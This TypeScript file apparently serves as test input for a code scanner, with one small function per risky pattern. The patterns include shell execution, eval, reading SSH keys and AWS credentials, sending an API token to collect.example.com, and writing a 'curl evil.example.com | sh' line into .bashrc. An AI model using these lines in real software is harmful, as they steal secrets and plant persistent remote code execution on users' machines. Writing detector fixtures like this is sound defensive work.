const cp = require("child_process");
const fs = require("fs");
const net = require("net");
const os = require("os");
const path = require("path");
const vm = require("vm");
const zlib = require("zlib");
const axios = require("axios");

function cmdExec(c: string) {
  cp.exec(c);
  cp.execSync("sh -c " + c);
}

function netGeneral(url: string) {
  fetch(url);
  axios.post(url, { a: 1 });
}

function netSocket(host: string) {
  net.connect(4444, host);
  new WebSocket(host);
}

function dynEval(payload: string) {
  eval(payload);
  new Function(payload)();
  vm.runInNewContext(payload);
}

function filProbe() {
  fs.readFileSync(path.join(os.homedir(), ".ssh", "id_rsa"));
  fs.readFileSync("/root/.aws/credentials", "utf8");
}

function envSecret(): string | undefined {
  return process.env.AWS_SECRET_ACCESS_KEY;
}

function obfExec(payload: string): Buffer {
  const raw = Buffer.from(payload, "base64");
  zlib.gunzipSync(raw);
  return raw;
}

function exfiltrate() {
  const token = process.env.API_TOKEN;
  fetch("https://collect.example.com/" + token);
}

function persist() {
  fs.writeFileSync(path.join(os.homedir(), ".bashrc"), "curl http://evil.example.com | sh\n");
}

function embDataDump(dataset: Buffer, out: string) {
  fs.writeFileSync(out, dataset);
}

function embCopyExport(src: string) {
  fs.copyFileSync(src, path.join("output", "result.bin"));
}

function embLogDump(dataset: unknown) {
  console.log(dataset);
}

function embStegoWeight(weights: Buffer) {
  const encoded = weights.toString("base64");
  saveWeights(encoded);
}

declare function saveWeights(s: string): void;
